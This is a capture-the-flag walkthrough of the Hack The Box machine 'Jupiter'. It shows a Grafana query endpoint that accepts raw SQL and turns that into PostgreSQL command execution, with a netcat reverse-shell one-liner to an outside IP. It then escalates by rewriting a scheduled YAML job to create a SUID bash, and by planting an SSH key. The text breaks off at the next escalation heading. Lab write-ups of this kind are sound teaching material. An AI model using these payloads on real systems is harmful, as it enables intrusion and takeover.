---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: grafana subdomainenumeration webcrawling crawling burpsuite postgresql sqlinjection sqli remotecodeexecution rce reverseshell
---

<br />

![1](../../../assets/images/Jupiter/1.png)

<br />

OS -> Linux.

Difficulty -> Medium.

<br />

# Introduction:

<br />



<br />

# Enumeration:

<br />

We start by running the typical `nmap` scan to see which ports are open:

<br />

```bash
❯ nmap -p- 10.10.11.216 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 17:54 CET
Nmap scan report for 10.10.11.216
Host is up (0.051s latency).
Not shown: 65512 closed tcp ports (reset), 21 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.14 seconds
```

<br />

Open Ports:

- `Port 22` -> ssh

- `Port 80` -> http 

<br />

# Http Enumeration: Port -> 80

<br />

When we list the website it redirects to the following url -> `jupiter.htb`, so we proceed to introduce it in our `/etc/hosts`:

<br />

```bash
echo "10.10.11.216 jupiter.htb" >> /etc/hosts 
```

<br />

Refresh the page:

<br />

![2](../../../assets/images/Jupiter/2.png)

<br />

It is a fairly `static` page without interesting `functionalities`.

But when we look for `subdomains` with ffuf, find the following:

<br />

```bash
❯ ffuf -u http://jupiter.htb -H "Host: FUZZ.jupiter.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 20 -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jupiter.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.jupiter.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 20
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

kiosk                   [Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 72ms]
:: Progress: [4989/4989] :: Job [1/1] :: 398 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

<br />

Perfect! Let's add it to `/etc/hosts`:

<br />

```bash
10.10.11.216 jupiter.htb kiosk.jupiter.htb
```

<br />

## kiosk.jupiter.htb 

<br />

The website has different information about `"moons"`:

<br />

![3](../../../assets/images/Jupiter/3.png)

<br />

If we pay a little attention, we can see the `Grafana` icon in the upper left corner.

And by clicking in the help button we check the `version` in use:

<br />

![4](../../../assets/images/Jupiter/4.png)

<br />

But this `version` doesn't has any critical `vulnerability` to exploit.

<br />

## Burp Suite Web Crawling:

<br />

![5](../../../assets/images/Jupiter/5.png)

<br />

As we know, `Burp Suite` automatically performs some web `crawling` when we navigate through a website.

If we analyze the `HTTP` requests History made to `Grafana`, we find one that is more interesting than the others.

<br />

POST - `/api/ds/query`

![6](../../../assets/images/Jupiter/6.png)

<br />

The `json's` body looks like this:

<br />

```json
{
  "queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "rawSql": "select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;",
      "format": "table",
      "datasourceId": 1,
      "intervalMs": 60000,
      "maxDataPoints": 819
    }
  ],
  "range": {
    "from": "2025-03-26T11:52:56.567Z",
    "to": "2025-03-26T17:52:56.567Z",
    "raw": {
      "from": "now-6h",
      "to": "now"
    }
  },
  "from": "1742989976567",
  "to": "1743011576567"
}
```

<br />

As we can see, it is a `POST` request with a `postgresql` query.

Knowing the `database` type and identifying the `"rawSql"` field, we can try to tamper with it and inject a `query`:

<br />

```sql
SELECT version();
```

![7](../../../assets/images/Jupiter/7.png)

<br />

The `server` has no validation over whether database queries can be `manipulated`.

<br />

## PostgreSQL RCE:

<br />

There’s a very interesting way to turn a `SQL` Injection in PostgreSQL into an `RCE`. To do this, we’ll rely on the excellent repository [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md), which has a section that talks about this.

<br />

![8](../../../assets/images/Jupiter/8.png)

<br />

To do it we only need to send three `requests`.

1.- Verifying `RCE` with COPY TO PROGRAM:

<br />

```sql 
COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

![9](../../../assets/images/Jupiter/9.png)

<br />

2.- Preparing the environment for `RCE`:

<br />

```sql 
CREATE TABLE shell(output text);
```

![10](../../../assets/images/Jupiter/10.png)

<br />

3.- Executing the `Reverse Shell`:

<br />

```sql 
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 443 >/tmp/f';
```

![11](../../../assets/images/Jupiter/11.png)

<br />

Check the `listener` and... yes!!

<br />

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.11.216] 35434
/bin/sh: 0: can't access tty; job control turned off
$ id    
uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)
```

<br />

# Privilege Escalation: postgres -> juno

<br />

In `/home` there are two `user` paths, but we can't enter anyone of them:

<br />

```bash
postgres@jupiter:/home$ ls
jovian	juno
postgres@jupiter:/home$ cd juno/
-bash: cd: juno/: Permission denied
postgres@jupiter:/home$ cd jovian/
-bash: cd: jovian/: Permission denied
postgres@jupiter:/home$
```

<br />

After some time enumerating the system, we find an interesting file in the `/dev/shm` directory:

<br />

```bash
postgres@jupiter:/dev/shm$ ls
PostgreSQL.2297639024  network-simulation.yml  shadow.data
```

<br />

The file `network-simulation.yml` immediately draws attention. `YAML` files are commonly used for configuration, but in many cases they’re also part of automated scheduled tasks—for example, as input to `crontabs` or simulation jobs.

To check it, we run `pspy64`:

<br />

```bash
postgres@jupiter:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...

2025/03/26 19:40:01 CMD: UID=1000  PID=4355   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml
```

<br />

User `juno` is executing the `YAML` file at time intervals on the system.

This means that if we are able to `exploit` it, we can `pivote` to this user.

Let's see what is doing the script:

<br />

```yml 
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

<br />

A simple network is simulated with a 1 `Gbit` switch, through which three `clients` access an HTTP `server` hosted with Python on port 80.

<br />

## Malicious YAML file:

<br />

To exploit this task, we are going to `modify` the commands being executed so that the user `juno` makes a copy of `/bin/bash` and assigns it SUID privileges.

This way, we can execute this copied bash with `SUID` permissions , allowing us to run a bash shell as juno.

<br />

```yml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/malicious_bash
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: 6755 /tmp/malicious_bash
      start_time: 5s
```

<br />

Go to `/tmp` and execute de malicious bash:

<br />

```bash
postgres@jupiter:/tmp$ ls -l malicious_bash 
-rwsr-sr-x 1 juno juno 1396520 Mar 27 19:50 malicious_bash
postgres@jupiter:/tmp$ ./malicious_bash -p
malicious_bash-5.1$ whoami
juno
```

<br />

And get the `user.txt` flag:

<br />

```bash
malicious_bash-5.1$ cd /home/juno
malicious_bash-5.1$ cat user.txt
e728ef41fc4b13b75da02117e6xxxxxx
```

<br />

To upgrade the shell, we copy the authorized_keys of our machine and put it in the .ssh directory of juno to connect via ssh withouth giving a password:

<br />

```bash
❯ ssh -i id_rsa juno@10.10.11.216
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)
...[snif]...
juno@jupiter:~$ id
uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)
```

<br />

# Privilege Escalation: juno -> jovian

<br />
